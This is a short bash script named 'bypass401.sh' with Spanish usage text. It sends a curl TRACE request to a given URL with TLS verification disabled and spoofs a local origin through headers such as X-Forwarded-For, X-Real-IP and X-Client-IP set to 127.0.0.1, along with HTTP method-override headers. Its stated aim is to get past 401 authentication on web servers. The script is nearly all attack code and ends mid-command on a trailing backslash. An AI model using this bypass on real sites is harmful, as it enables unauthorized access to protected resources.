#!/bin/bash
echo "Uso.: ./bypass401.sh https://url"
# Otros metodos HTTP: -X ARBITRARY ACL TRACK
curl -k -s --http1.0 -vvv $1 -X "TRACE" \
-H "X-HTTP-Method-Override: ACL" \
-H "X-Originating-IP: 127.0.0.1" \
-H "X-Forwarded-For: 127.0.0.1" \
-H "X-Forwarded-Host: 127.0.0.1" \
-H "X-Forwared-Host: 127.0.0.1" \
-H "X-Real-IP: 127.0.0.1" \
-H "X-Remote-IP: 127.0.0.1" \
-H "X-Remote-Addr: 127.0.0.1" \
-H "X-Client-IP: 127.0.0.1" \
-H "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0" \
-H "Accept: text/html, applicattion/xhtml+xml, application/xml;q=0.9,*/*;q=0.8" \
-H "Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3" \
-H "Connection: keep-alive" \
-H 'X-Method-Override: ARBITRARY' \

